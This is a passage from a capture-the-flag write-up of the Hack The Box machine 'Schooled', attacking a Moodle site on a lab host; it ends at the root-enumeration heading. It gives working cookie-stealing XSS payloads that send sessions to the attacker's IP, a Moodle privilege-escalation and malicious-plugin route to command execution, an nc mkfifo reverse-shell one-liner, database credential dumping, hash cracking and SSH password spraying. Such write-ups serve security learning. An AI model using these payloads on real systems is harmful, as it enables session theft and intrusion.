Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 801.40 seconds
</code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2>
<h3 id=tcp-80---schooledhtb>TCP 80 - schooled.htb<a class=anchor aria-hidden=true href=#tcp-80---schooledhtb>#</a></h3>
<p>Port 80 serving a homepage of a school institution.</p>
<p><div class=img-container><img src=imgs/image-20210518035709619.png alt=image-20210518035709619></div>
</p>
<p>In the About section, it states that this school has an online learning system using Moodle, which the most popular LMS.</p>
<p><div class=img-container><img src=imgs/image-20210518041407775.png alt=image-20210518041407775></div>
</p>
<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
<p><div class=img-container><img src=imgs/image-20210518035931687.png alt=image-20210518035931687></div>
</p>
<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it&rsquo;s 404.</p>
<p><div class=img-container><img src=imgs/image-20210518041456970.png alt=image-20210518041456970></div>
</p>
<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
<p><div class=img-container><img src=imgs/image-20210518035750397.png alt=image-20210518035750397></div>
</p>
<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «schooled» «10.10.14.49» 
$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
</code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «schooled» «10.10.14.49» 
$  curl -s http://10.10.10.234/ <span class=p>|</span> wc -c
<span class=m>20750</span>
→ root@kali «schooled» «10.10.14.49» 
$ curl -s http://schooled.htb/ <span class=p>|</span> wc -c
<span class=m>20750</span>
</code></pre></div><h3 id=subdomain-fuzz>Subdomain Fuzz<a class=anchor aria-hidden=true href=#subdomain-fuzz>#</a></h3>
<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «schooled» «10.10.14.49» 
$ gobuster vhost -u <span class=s1>&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class=o>===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
<span class=o>===============================================================</span>
<span class=o>[</span>+<span class=o>]</span> Url:          http://schooled.htb/
<span class=o>[</span>+<span class=o>]</span> Method:       GET
<span class=o>[</span>+<span class=o>]</span> Threads:      <span class=m>10</span>
<span class=o>[</span>+<span class=o>]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
<span class=o>[</span>+<span class=o>]</span> User Agent:   gobuster/3.1.0
<span class=o>[</span>+<span class=o>]</span> Timeout:      <span class=nv>10s</span>
<span class=o>===============================================================</span>
2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class=nv>mode</span>
<span class=o>===============================================================</span>
Found: moodle.schooled.htb <span class=o>(</span>Status:  200<span class=o>)</span> <span class=o>[</span>Size: 84<span class=o>]</span>
</code></pre></div><p>Update <code>/etc/hosts</code>:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «schooled» «10.10.14.49» 
$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
</code></pre></div><p>moodle.schooled.htb</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «schooled» «10.10.14.49» 
$ curl -s http://moodle.schooled.htb/ <span class=p>|</span> wc -c <span class=o>&amp;&amp;</span> curl -s http://schooled.htb <span class=p>|</span> wc -c
<span class=m>84</span>
<span class=m>20750</span>
</code></pre></div><h3 id=tcp-80---moodleschooledhtb>TCP 80 - moodle.schooled.htb<a class=anchor aria-hidden=true href=#tcp-80---moodleschooledhtb>#</a></h3>
<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href=https://moodle.org/>Moodle LMS</a>. There are four courses available here.</p>
<p><div class=img-container><img src=imgs/image-20210518171919132.png alt=image-20210518171919132></div>
</p>
<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
<p><div class=img-container><img src=imgs/image-20210518173145572.png alt=image-20210518173145572></div>
</p>
<h4 id=account-register>Account Register<a class=anchor aria-hidden=true href=#account-register>#</a></h4>
<p>It seems to register an account, I have to use the domain <code>student.schooled.htb</code>. I will change my email domain and login afterwards.</p>
<p><div class=img-container><img src=imgs/image-20210518173537504.png alt=image-20210518173537504></div>
</p>
<p>After adding <code>student.schooled.htb</code> domain to my <code>/etc/hosts</code>, I visited the domain, but it&rsquo;s just the same site as <code>schooled.htb</code>.</p>
<h4 id=enroll-course>Enroll course<a class=anchor aria-hidden=true href=#enroll-course>#</a></h4>
<p>Based on the login activity only one of four teachers that seems to be active, that teacher is Manuel Phillips. So I will enroll to his course (it allows self-enroll).</p>
<p><div class=img-container><img src=imgs/image-20210518174336502.png alt=image-20210518174336502></div>
</p>
<p>On the Mathematics course, there are two announcements .</p>
<p><div class=img-container><img src=imgs/image-20210518175011420.png alt=image-20210518175011420></div>
</p>
<p>The first one titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips contains the following:</p>
<p><div class=img-container><img src=imgs/image-20210518175100601.png alt=image-20210518175100601></div>
</p>
<p>After searching the MoodleNet on Google, I can found it under <code>Dashboard -> Preferences -> User account -> Edit profile</code> .</p>
<p><div class=img-container><img src=imgs/image-20210518183135218.png alt=image-20210518183135218></div>
</p>
<p>And the other one by Jamie Borham, which seems to be a reminder.</p>
<p><div class=img-container><img src=imgs/image-20210518175145618.png alt=image-20210518175145618></div>
</p>
<h3 id=finding-vulnerabilities>Finding Vulnerabilities<a class=anchor aria-hidden=true href=#finding-vulnerabilities>#</a></h3>
<h4 id=exploit-db>Exploit-DB<a class=anchor aria-hidden=true href=#exploit-db>#</a></h4>
<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
<ul>
<li>Moodle 3.6.1 - Persistent Cross-Site Scripting (XSS) => CVE-2019-3810, PrivEsc student to administrator vs. box release 2021.</li>
<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting => Need a teacher or an administrator or a manager role.</li>
<li>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting => Worth to try.</li>
</ul>
<p><div class=img-container><img src=imgs/image-20210518183748916.png alt=image-20210518183748916></div>
</p>
<h4 id=moodle-security>Moodle Security<a class=anchor aria-hidden=true href=#moodle-security>#</a></h4>
<p>The other place to look for the Moodle vulnerabilities/security issues is on <a href=https://moodle.org/security/>https://moodle.org/security/</a>.</p>
<p>Searching page by page, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
<p><div class=img-container><img src=imgs/image-20210518220404280.png alt=image-20210518220404280></div>
</p>
<p>Another one that looks promising is the privilege escalation from the teacher role and manager role.</p>
<p><div class=img-container><img src=imgs/image-20210520020814806.png alt=image-20210520020814806></div>
</p>
<h3 id=testing-xss>Testing XSS<a class=anchor aria-hidden=true href=#testing-xss>#</a></h3>
<h4 id=moodle-3103---label-persistent-cross-site-scripting>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting<a class=anchor aria-hidden=true href=#moodle-3103---label-persistent-cross-site-scripting>#</a></h4>
<p>I tried <code>Moodle 3.10.3 - 'label' Persistent Cross Site Scripting</code> using the following payload.</p>
<pre tabindex=0><code>&lt;img src=&quot;http://10.10.14.49/iamf.js&quot; onerror=&quot;alert('iamf')&quot; /&gt;
</code></pre><p><div class=img-container><img src=imgs/image-20210518214318578.png alt=image-20210518214318578></div>
</p>
<p>It worked.</p>
<p><div class=img-container><img src=imgs/image-20210518214351609.png alt=image-20210518214351609></div>
</p>
<p>Unfortunately, it&rsquo;s an XHR.. didn&rsquo;t know how to get the link, and probably teacher won&rsquo;t look into calendar.</p>
<p>Based on this XSS, it seems the currently hosted Moodle version is &lt; 3.10.</p>
<h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2>
<h3 id=access-as-manuel-phillips>Access as Manuel Phillips<a class=anchor aria-hidden=true href=#access-as-manuel-phillips>#</a></h3>
<h4 id=moodle-cve-2020-25627---stored-xss-via-moodlenet-profile>Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile<a class=anchor aria-hidden=true href=#moodle-cve-2020-25627---stored-xss-via-moodlenet-profile>#</a></h4>
<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo; twice. Therefore, I&rsquo;m guessing that the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) affected the MoodleNet profile fits this. With XSS I can attempt to <a href=https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies>steal Phillip&rsquo;s cookie session</a>.</p>
<p>I will have my Netcat listening on port 80, then I will edit my MoodleNet profile (<code>Dashboard > Preferences > User account > Edit profile > MoodleNet profile</code>) and change its value to the following payload:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span> <span class=nx>iamf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Image</span><span class=p>();</span> <span class=nx>iamf</span><span class=p>.</span><span class=nx>src</span><span class=o>=</span><span class=s1>&#39;http://10.10.14.49/?iamf=&#39;</span><span class=o>+</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</code></pre></div><p>Or this one:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span><span class=nb>document</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=s1>&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class=o>+</span> <span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span> <span class=o>+</span> <span class=s1>&#39;&#34; /&gt;&#39;</span><span class=p>)&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</code></pre></div><p><div class=img-container><img src=imgs/image-20210520012522733.png alt=image-20210520012522733></div>
</p>
<p>After a few minutes, there is a request coming to my listener:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «exploits» «10.10.14.49» 
$ nc -nvlp <span class=m>80</span>
listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>80</span> ...
connect to <span class=o>[</span>10.10.14.49<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.234<span class=o>]</span> <span class=m>26076</span>
GET /?iamf<span class=o>=</span><span class=nv>MoodleSession</span><span class=o>=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
Host: 10.10.14.49
User-Agent: Mozilla/5.0 <span class=o>(</span>X11<span class=p>;</span> FreeBSD amd64<span class=p>;</span> rv:86.0<span class=o>)</span> Gecko/20100101 Firefox/86.0
Accept: image/webp,*/*
Accept-Language: en-US,en<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class=o>=</span><span class=m>33</span>
</code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
<p><div class=img-container><img src=imgs/image-20210520013212895.png alt=image-20210520013212895></div>
</p>
<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
<p><div class=img-container><img src=imgs/image-20210915212643838.png alt=image-20210915212643838></div>
</p>
<p>By visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&course=5</code>, I can confirm that this Moodle version is 3.9.</p>
<p><div class=img-container><img src=imgs/image-20210915213438687.png alt=image-20210915213438687></div>
</p>
<h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3>
<h4 id=moodle-cve-2020-14321---teacher-role---manager-role>Moodle CVE-2020-14321 - Teacher role -> Manager role<a class=anchor aria-hidden=true href=#moodle-cve-2020-14321---teacher-role---manager-role>#</a></h4>
<p>With Phillips&rsquo;s account, I can confirm that I have the teacher role now, and since the version is known, I can attempt to exploit the privilege escalation (<code>CVE-2020-14321</code>) that affected this Moodle version.</p>
<p>The researcher who found this vulnerability made a public exploit for this on Github: <a href=https://github.com/HoangKien1020/CVE-2020-14321>https://github.com/HoangKien1020/CVE-2020-14321</a>. He also created step by step video on <a href=https://vimeo.com/441698193>https://vimeo.com/441698193</a>.</p>
<p>Using the video as reference, the first step is enroll one of the teacher to my course.</p>
<p><div class=img-container><img src=imgs/image-20210520022325198.png alt=image-20210520022325198></div>
</p>
<p>I will enroll Jamie Borham to my course and submit on <code>Enrol users</code> button.</p>
<p><div class=img-container><img src=imgs/image-20210520022826655.png alt=image-20210520022826655></div>
</p>
<p>I will intercept the request using Burp Suite and change the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
<p><div class=img-container><img src=imgs/image-20210520023902707.png alt=image-20210520023902707></div>
</p>
<p>On the course participant, I can see Phillips now has the manager role assigned.</p>
<p><div class=img-container><img src=imgs/image-20210915214751404.png alt=image-20210915214751404></div>
</p>
<p>With manager role, I have the ability to impersonate my participant using &ldquo;Login as&rdquo; function. For example, if I want to login as Jane Higgins, it has to be on my course (mathematics) as participant first.</p>
<p><div class=img-container><img src=imgs/image-20210520032135611.png alt=image-20210520032135611></div>
</p>
<h4 id=malicious-plugin>Malicious Plugin<a class=anchor aria-hidden=true href=#malicious-plugin>#</a></h4>
<p>When impersonating Lianne Carter, I see another menu called &ldquo;Site Administration&rdquo;.</p>
<p><div class=img-container><img src=imgs/image-20210915221840588.png alt=image-20210915221840588></div>
</p>
<p>According to the exploit author of <a href=https://github.com/HoangKien1020/CVE-2020-14321>CVE-2020-14321</a>, with manager role, I can obtain code execution on the underlying system by installing a malicious plugin. This can be done only if the manager role has full permissions (from my understanding this is possible because Lianne Carter has administrative access and manager role).</p>
<p>That said, I have to edit the manager role permission under <code>Site Administration</code> -> <code>Users</code> -> <code>Define roles</code> -> <code>Manager</code> -> <code>Edit</code>.</p>
<p><div class=img-container><img src=imgs/image-20210915222952344.png alt=image-20210915222952344></div>
</p>
<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
<p><div class=img-container><img src=imgs/image-20210915223616445.png alt=image-20210915223616445></div>
</p>
<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href=https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions>PoC</a>.</p>
<p><div class=img-container><img src=imgs/image-20210915223955951.png alt=image-20210915223955951></div>
</p>
<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -> <code>Plugins</code> -> <code>Install plugins</code></p>
<p><div class=img-container><img src=imgs/image-20210915224410922.png alt=image-20210915224410922></div>
</p>
<p>I will grab the malicious plugin from this repository: <a href=https://github.com/HoangKien1020/Moodle_RCE>https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
<p><div class=img-container><img src=imgs/image-20210915225327871.png alt=image-20210915225327871></div>
</p>
<p>I will just continue on the installation process.</p>
<p><div class=img-container><img src=imgs/image-20210915230537390.png alt=image-20210915230537390></div>
</p>
<p>Once the plugin is installed, it can be access on.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text> http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]
</code></pre></div><p>And I have RCE now</p>
<p><div class=img-container><img src=imgs/image-20210520034807810.png alt=image-20210520034807810></div>
</p>
<h4 id=reverse-shell>Reverse Shell<a class=anchor aria-hidden=true href=#reverse-shell>#</a></h4>
<p>Since it&rsquo;s FreeBSD, I will send the mkfifo payload .</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
</code></pre></div><p>On my listener:</p>
<p><div class=img-container><img src=imgs/image-20210520041503270.png alt=image-20210520041503270></div>
</p>
<p>I will upgrade my shell.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ /usr/local/bin/python3 -c <span class=s2>&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
<span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
$ which stty
which stty
/bin/stty
$ ^Z
<span class=o>[</span>1<span class=o>]</span>  + <span class=m>4974</span> suspended  nc -nvlp <span class=m>53</span>
→ root@kali «exploits» «10.10.14.49» 
$ stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
<span class=o>[</span>1<span class=o>]</span>  + <span class=m>4974</span> continued  nc -nvlp <span class=m>53</span>

$ ls -l
total <span class=m>0</span>
$ ls -la
total <span class=m>0</span>
$ <span class=nb>pwd</span>
/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
</code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2>
<h3 id=shell-as-jamie>Shell as jamie<a class=anchor aria-hidden=true href=#shell-as-jamie>#</a></h3>
<h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4>
<p>There are two users other than root who have login shell.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ cat /etc/passwd <span class=p>|</span> grep sh$
root:*:0:0:Charlie <span class=p>&amp;</span>:/root:/bin/csh
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
steve:*:1002:1002:User <span class=p>&amp;</span>:/home/steve:/bin/csh
$ ls -l /home/
total <span class=m>17</span>
drwx------  <span class=m>2</span> jamie  jamie  <span class=m>11</span> Feb <span class=m>28</span> 18:13 jamie
drwx------  <span class=m>5</span> steve  steve  <span class=m>14</span> Mar <span class=m>17</span> 14:05 steve
</code></pre></div><p>The directory of the web is discovered under <code>/usr/local/www/apache24/data</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ ls -l
total <span class=m>18</span>
-rw-r--r--   <span class=m>1</span> www  www  <span class=m>84</span> Dec <span class=m>19</span> 15:41 index.html
drwxr-xr-x  <span class=m>56</span> www  www  <span class=m>95</span> Feb <span class=m>27</span> 14:33 moodle
drwxr-xr-x   <span class=m>6</span> www  www  <span class=m>11</span> Feb <span class=m>27</span> 17:18 schooled.htb
$ <span class=nb>pwd</span>
/usr/local/www/apache24/data
</code></pre></div><p>The config file contains database credentials.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ cat config.php 
&lt;?php  // Moodle configuration file

unset<span class=o>(</span><span class=nv>$CFG</span><span class=o>)</span><span class=p>;</span>
global <span class=nv>$CFG</span><span class=p>;</span>
<span class=nv>$CFG</span> <span class=o>=</span> new stdClass<span class=o>()</span><span class=p>;</span>

<span class=nv>$CFG</span>-&gt;dbtype    <span class=o>=</span> <span class=s1>&#39;mysqli&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;dblibrary <span class=o>=</span> <span class=s1>&#39;native&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;dbhost    <span class=o>=</span> <span class=s1>&#39;localhost&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;dbname    <span class=o>=</span> <span class=s1>&#39;moodle&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;dbuser    <span class=o>=</span> <span class=s1>&#39;moodle&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;dbpass    <span class=o>=</span> <span class=s1>&#39;PlaybookMaster2020&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;prefix    <span class=o>=</span> <span class=s1>&#39;mdl_&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;dboptions <span class=o>=</span> array <span class=o>(</span>
  <span class=s1>&#39;dbpersist&#39;</span> <span class=o>=</span>&gt; 0,
  <span class=s1>&#39;dbport&#39;</span> <span class=o>=</span>&gt; 3306,
  <span class=s1>&#39;dbsocket&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;&#39;</span>,
  <span class=s1>&#39;dbcollation&#39;</span> <span class=o>=</span>&gt; <span class=s1>&#39;utf8_unicode_ci&#39;</span>,
<span class=o>)</span><span class=p>;</span>

<span class=nv>$CFG</span>-&gt;wwwroot   <span class=o>=</span> <span class=s1>&#39;http://moodle.schooled.htb/moodle&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;dataroot  <span class=o>=</span> <span class=s1>&#39;/usr/local/www/apache24/moodledata&#39;</span><span class=p>;</span>
<span class=nv>$CFG</span>-&gt;admin     <span class=o>=</span> <span class=s1>&#39;admin&#39;</span><span class=p>;</span>

<span class=nv>$CFG</span>-&gt;directorypermissions <span class=o>=</span> 0777<span class=p>;</span>

require_once<span class=o>(</span>__DIR__ . <span class=s1>&#39;/lib/setup.php&#39;</span><span class=o>)</span><span class=p>;</span>

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
</code></pre></div><h4 id=mysql>MySQL<a class=anchor aria-hidden=true href=#mysql>#</a></h4>
<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ /usr/local/bin/mysql moodle -u moodle -pPlaybookMaster2020
mysql: <span class=o>[</span>Warning<span class=o>]</span> Using a password on the <span class=nb>command</span> line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with <span class=p>;</span> or <span class=se>\g</span>.
Your MySQL connection id is <span class=m>7517</span>
Server version: 8.0.23 Source distribution

Copyright <span class=o>(</span>c<span class=o>)</span> 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class=s1>&#39;help;&#39;</span> or <span class=s1>&#39;\h&#39;</span> <span class=k>for</span> help. Type <span class=s1>&#39;\c&#39;</span> to clear the current input statement.

moodle@localhost <span class=o>[</span>moodle<span class=o>]</span>&gt; 
</code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>moodle@localhost <span class=o>[</span>moodle<span class=o>]</span>&gt; <span class=k>select</span> username,password from mdl_user<span class=p>;</span>
+-------------------+--------------------------------------------------------------+
<span class=p>|</span> username          <span class=p>|</span> password                                                     <span class=p>|</span>
+-------------------+--------------------------------------------------------------+
<span class=p>|</span> guest             <span class=p>|</span> <span class=nv>$2</span>y<span class=nv>$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class=p>|</span>
<span class=p>|</span> admin             <span class=p>|</span> <span class=nv>$2</span>y<span class=nv>$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class=p>|</span>
...<span class=o>[</span>SNIP<span class=o>]</span>...
<span class=p>|</span> iamf              <span class=p>|</span> <span class=nv>$2</span>y<span class=nv>$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class=p>|</span>
+-------------------+--------------------------------------------------------------+
<span class=m>33</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>

moodle@localhost <span class=o>[</span>moodle<span class=o>]</span>&gt; 
</code></pre></div><p>There are a lot of hashes to recover, so I will focus on the admin first.</p>
<h4 id=crack-hash>Crack hash<a class=anchor aria-hidden=true href=#crack-hash>#</a></h4>
<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
<pre tabindex=0><code>$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
Time.Started.....: Thu May 20 05:04:20 2021 (1 min, 25 secs)
Time.Estimated...: Thu May 20 05:05:45 2021 (0 secs)
Guess.Base.......: File (../rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      166 H/s (2.93ms) @ Accel:4 Loops:2 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 13992/14344386 (0.10%)
Rejected.........: 0/13992 (0.00%)
Restore.Point....: 13728/14344386 (0.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1022-1024
Candidates.#1....: david23 -&gt; 110487
Hardware.Mon.#1..: Temp: 90c Util: 88% Core:1708MHz Mem:3504MHz Bus:16

Started: Thu May 20 05:04:18 2021
Stopped: Thu May 20 05:05:46 2021
</code></pre><h4 id=password-spray>Password Spray<a class=anchor aria-hidden=true href=#password-spray>#</a></h4>
<p>I spray the password on SSH, and it reveals that it&rsquo;s password for user <strong>jamie</strong>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@kali «schooled» «10.10.14.49» 
$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
SSH         10.10.10.234    <span class=m>22</span>     10.10.10.234     <span class=o>[</span>*<span class=o>]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
SSH         10.10.10.234    <span class=m>22</span>     10.10.10.234     <span class=o>[</span>-<span class=o>]</span> root:PlaybookMaster2020 Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
SSH         10.10.10.234    <span class=m>22</span>     10.10.10.234     <span class=o>[</span>-<span class=o>]</span> root:!QAZ2wsx Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
SSH         10.10.10.234    <span class=m>22</span>     10.10.10.234     <span class=o>[</span>-<span class=o>]</span> jamie:PlaybookMaster2020 Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
SSH         10.10.10.234    <span class=m>22</span>     10.10.10.234     <span class=o>[</span>+<span class=o>]</span> jamie:!QAZ2wsx 
SSH         10.10.10.234    <span class=m>22</span>     10.10.10.234     <span class=o>[</span>-<span class=o>]</span> steve:PlaybookMaster2020 Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
SSH         10.10.10.234    <span class=m>22</span>     10.10.10.234     <span class=o>[</span>-<span class=o>]</span> steve:!QAZ2wsx Bad authentication type<span class=p>;</span> allowed types: <span class=o>[</span><span class=s1>&#39;publickey&#39;</span>, <span class=s1>&#39;keyboard-interactive&#39;</span><span class=o>]</span>
</code></pre></div><h4 id=ssh>SSH<a class=anchor aria-hidden=true href=#ssh>#</a></h4>
<p>Now I can login as jamie via SSH.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>→ root@kali «schooled» «10.10.14.49» 
$ ssh jamie@10.10.10.234
The authenticity of host <span class=s1>&#39;10.10.10.234 (10.10.10.234)&#39;</span> can<span class=s1>&#39;t be established.
</span><span class=s1>ECDSA key fingerprint is SHA256:BiWc+ARPWyYTueBR7SHXcDYRuGsJ60y1fPuKakCZYDc.
</span><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span class=s1>Warning: Permanently added &#39;</span>10.10.10.234<span class=err>&#39;</span> <span class=o>(</span>ECDSA<span class=o>)</span> to the list of known hosts.
Password <span class=k>for</span> jamie@Schooled:
Last login: Tue Mar <span class=m>16</span> 14:44:53 <span class=m>2021</span> from 10.10.14.5
FreeBSD 13.0-BETA3 <span class=o>(</span>GENERIC<span class=o>)</span> <span class=c1>#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>

...&lt;SNIP&gt;...

jamie@Schooled:~ $ id
<span class=nv>uid</span><span class=o>=</span>1001<span class=o>(</span>jamie<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1001<span class=o>(</span>jamie<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1001<span class=o>(</span>jamie<span class=o>)</span>,0<span class=o>(</span>wheel<span class=o>)</span>
</code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3>
<h4 id=enumeration-2>Enumeration<a class=anchor aria-hidden=true href=#enumeration-2>#</a></h4>
